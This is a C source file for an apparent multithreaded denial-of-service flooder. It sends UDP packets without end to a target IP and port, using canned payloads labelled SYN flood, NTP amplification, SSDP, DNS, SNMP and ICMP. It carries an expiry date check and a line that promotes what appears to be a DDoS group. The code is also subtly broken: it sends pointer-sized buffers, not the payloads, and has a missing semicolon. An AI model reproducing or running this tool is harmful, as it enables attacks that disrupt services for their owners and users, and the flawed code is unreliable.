#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
void usage() {
    printf("Usage: ./program <IP> <Port> <Threads> <Action>\n");
    printf("Action: 1 to start the attack, 2 to stop the attack\n");
    exit(1);
}
void check_expiry() {
    struct tm expiry = {0};
    expiry.tm_year = 2024 - 1900; // Year since 1900
    expiry.tm_mon = 9;  // September (0-based, so 8 is September)
    expiry.tm_mday = 10; // 10th day
    time_t expiry_time = mktime(&expiry); 
    if (expiry_time == (time_t)-1) {
        perror("Error creating expiry time");
        exit(1);
    }
    time_t current_time = time(NULL);
    if (difftime(current_time, expiry_time) > 0) {
        printf("This program has expired and is no longer functional after 10th September 2024.\n");
        exit(1);
    }
}
struct thread_data {
    char *ip;
    int port;
};
void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char *payloads[] = {
        "GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: stress-test/1.0\r\n\r\n",
        "POST / HTTP/1.1\r\nHost: badserver.com\r\nContent-Length: 9999\r\n\r\nmalformed-data",
        "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01",  // DNS Query
        "\x45\x00\x00\x30\xab\xcd\x00\x00\x40\x06\xb8\x6e\xc0\xa8\x00\x01\xc0\xa8\x00\x02\x04\xd2\x00\x50\x00\x00\x00\x00\x00\x00\x00\x00\x50\x02\x20\x00\x91\x7c\x00\x00",  // SYN Flood
        "M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:ssdp:all\r\nMan:\"ssdp:discover\"\r\nMX:1\r\n\r\n",  // SSDP
        "\xDE\xAD\xBE\xEF\xBA\xD0\xFA\xCE",  // Random Binary Payload
        "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\xff\x00\xff",  // Malformed DNS
        "\x17\x00\x03\x2a\x00\x00\x00\x00",  // NTP Amplification
        "\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x19\x02\x04\x00\x00\x00\x01\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00",  // SNMP GetRequest
        "\x08\x00\xf7\xff\x00\x01\x00\x01"  // ICMP Echo Request (Ping)
    };
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);
    while (1) { // Infinite loop until stopped manually
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], sizeof(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }
    close(sock);
    pthread_exit(NULL);
}
int main(int argc, char *argv[]) {
    check_expiry();
    if (argc != 5) {
        usage();
    }
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    int action = atoi(argv[4]);  // Action to start or stop the attack
    if (port <= 0 || threads <= 0) {
        fprintf(stderr, "Invalid arguments.\n");
        exit(1);
    }
    if (action == 1) {
        // Start the attack
        pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));

        for (int i = 0; i < threads; i++) {
            struct thread_data *data = malloc(sizeof(struct thread_data));
            data->ip = strdup(ip);
            data->port = port;
            if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
                perror("Thread creation failed");
                free(thread_ids);
                exit(1);
            }
            printf("Launched thread with ID: %lu\n", thread_ids[i]);
        }
        for (int i = 0; i < threads; i++) {
            pthread_join(thread_ids[i], NULL);
        }
        free(thread_ids);
        printf("Attack finished join @ddos_practice\n");
    } else if (action == 2) {
        // Stop the attack (we assume external control or manual stop is needed)
        exit(1)
        printf("Attack stopped.\n");
    } else {
        printf("Invalid action. Use 1 to start and 2 to stop the attack.\n");
        usage();
    }
    return 0;
}